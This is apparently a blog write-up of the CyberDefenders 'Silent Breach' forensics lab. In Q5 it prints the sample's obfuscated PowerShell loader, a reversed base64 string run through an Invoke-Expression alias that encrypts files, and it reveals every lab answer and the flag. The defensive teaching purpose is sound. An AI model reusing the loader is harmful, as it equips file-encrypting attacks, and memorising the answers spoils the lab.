---
author: Ricard Alcaraz Mancebo
title: Silent Breach Lab - CyberDefenders
tags:
  - Cybersecurity
  - Blue Team
  - Digital Forensics
  - CyberDefenders
  - Malware Analysis
languages:
  - eztools
  - cyberchef
  - ftkimager
image:
  url: https://cyberdefenders.org/media/terraform/Silent%20Breach/Silent_Breach.webp
  alt: image of the lab
description: My notes solving Silent Breach Lab - CyberDefenders
pubDate: 2025-08-31T12:49:00.000+02:00
---
## Scenario
The IMF is hit by a cyber attack compromising sensitive data. Luther sends Ethan to retrieve crucial information from a compromised server. Despite warnings, Ethan downloads the intel, which later becomes unreadable. To recover it, he creates a forensic image and asks Benji for help in decoding the files.

## Documents Provided

- ethanPC.ad1

Resources:

- [Windows Mail Artifacts: Microsoft HxStore.hxd (email) Research](https://boncaldoforensics.wordpress.com/2018/12/09/microsoft-hxstore-hxd-email-research/)

## Q1: What is the MD5 hash of the potentially malicious EXE file the user downloaded?

First I took a look at the Resources link, take a a look at it its posible that it will be userful at some point of the lab. Then we will neet to use FTKImager to open the provided file `ethanPC.ad1`.
Then I started looking at the Downloads folder, as a starting point, and there we already can find something suspicious:

![cyberchef](/images/silent-breach-lab/q1.webp)

The file `IMF-Info.pdf.exe` seems suspicious to me, since it has a `.pdf` and a `.exe` that can confuse a victim and open it thinking its a `.pdf`. Then I used the option `Export File Hash List` right-clicking the file to provide me already the MD5 hash.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    336a7cf476ebc7548c93507339196abb
  </div>
</details>

## Q2: What is the URL from which the file was downloaded?

Clicking the suspicious file in the suspucious file, we can see that inside there is a `Zone.Identifier` this will provide us the information for this question.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    http://192.168.16.128:8000/IMF-Info.pdf.exe
  </div>
</details>

## Q3: What application did the user use to download this file?

So in this one there should be an easier way, but the way I did it was downloading the 
```cmd
\AppData\Local\ConnectedDevicesPlatform\0f17d47646a49d05\ActivitiesCache.db
``` 
and then use the EZ Tool `WxTCmd.exe` the reason is because I thought that I could find the program used looking to the date of the suspicious file and looking for some browser being open around that time, well looking at the `ActivitiesCache.db` I only saw one browser so I guessed that that was the one used to download the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Microsoft Edge
  </div>
</details>

## Q4: By examining Windows Mail artifacts, we found an email address mentioning three IP addresses of servers that are at risk or compromised. What are the IP addresses?

Now, lets revisit the Resources link, there we can find a path to the Windows Mail artifact, I will examine the `HxStore.hxd`. I'm using CyberChef to extract the IP addresses of the file. 

![cyberchef](/images/silent-breach-lab/q2.webp)

This way I have obtained the IPs also, searching the IPs in the data to see if there is more interesting information inside it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    145.67.29.88, 212.33.10.112, 192.168.16.128
  </div>
</details>


## Q5: By examining the malicious executable, we found that it uses an obfuscated PowerShell script to decrypt specific files. What predefined password does the script use for encryption?

Hardest one so far, so here we have to examinate the malicious executable. What I did was extract it (Advice: use a isolated machine) and the I examinated the data opening it in Visual Studio. There since we know its a PowerShell script I just searched first a `$` to see if there are some variables or something similar, there are too much `$` so I tried to search for `ps1` I thought that probably they need to create a file `.ps1` and there were 4 results, using `.ps1` just one.
So I found this piece of code:
```powershell
$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QfK0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSBCIgAiCNoQDpgSZz9GbD5SbhVmc0NFd19GJgACIgoQDpgSZz9GbD5SbhVmc0N1b0BXeyNGJgACIgoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJgACIgoQDpgGdn5WZM5yclRXeC5WahxGckACLwACLzVGd5JkbpFGbwRCKlRXaydlLtFWZyR3UvRHc5J3YkACIgAiCNoQDpUGdpJ3V6oTXlR2bN1WYlJHdT9GdwlncD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBCLy9Gdwlncj5WZkACLtFWZyR3U0V3bkgSbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3UvRHc5J3YkACIgAiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkACIgAiCNoQDpUGbpZEd1BnbpRCKzVGd5JEbsFEZhVmU6oTXlxWaG5yTJ5SblR3c5N1Wg0DIzVGd5JkbpFGbwRCIgACIK0gCNkCKy9Gdwlncj5WRlRXYlJ3QuMXZhRCI9AicvRHc5J3YuVGJgACIgoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJgACIgoQDDJ0Q6oTXlR2bNJXZoBXaD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgUGZv1kLzVWYkACIgAiCNYXakASPgYVSuMXZhRCIgACIK0QeltGJg0DI5V2SuMXZhRCIgACIK0QKoUGdhVmcDpjOdNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgMXZhRCIgACIK0gCNcyYuVmLnACLnQiZkBnLcdCIlNWYsBXZy1CIlxWaGRXdw5WakASPgUGbpZEd1BHd19GJgACIgoQD7BSKzVGbpZEd1BnbpRCIulGIlxWaGRXdw5WakgCIoNWYlJ3bmpQDK0QKK0gImRGcu42bpN3cp1ULG1UScxFcvR3azVGRcxlbhhGdlxFXzJXZzVFXcpzQiACIgAiCNwiImRGcuQXZyNWZT1iRNlEXcB3b0t2clREXc5WYoRXZcx1cyV2cVxFX6MkIgACIgoQDoAEI9AyclxWaGRXdw5WakoQDzVGbpZGI0VHculGIm9GI0NXaMByIK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQyYlNVNyAjMj8mZuFiZtlkIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ;
new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ;
pwn $FHG7xpKlVqaDNgu1c2Utw ;
```
We can see that there are some transformations to a initial string, I just used executed the first part before the Invoke, but printing out the last transformation with `Write-Output`, the key variable is `$FHG7xpKlVqaDNgu1c2Utw` printing this out after the other processes you can find the password.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Imf!nfo#2025Sec$
  </div>
</details>

## Q6: After identifying how the script works, decrypt the files and submit the secret string.
First from the code we can locate where the encrypted files are, there are in the Desktop, so using the FTKImager we can extract them.
So from the last question we have the powershell script used to encrypt the files, now we have to do the opossite, decrypt the files. I had to research a bit, but it was not too hard I did this changes:

```powershell
...
$inputFiles = @(
#Location of the .enc files
    "IMF-Secret.enc",

    "IMF-Mission.enc"
)
...
$outputFile = $inputFile -replace '.enc', '.pdf'
...
$decryptor = $aes.CreateDecryptor()
...
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
...
```
With this changes it already worked for me. Now inside the result file `IMF-Mission.pdf` you can find the flag. 

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    CyberDefenders{N3v3r_eX3cuTe_F!l3$_dOwnL0ded_fr0m_M@lic10u5_$erV3r}
  </div>
</details>
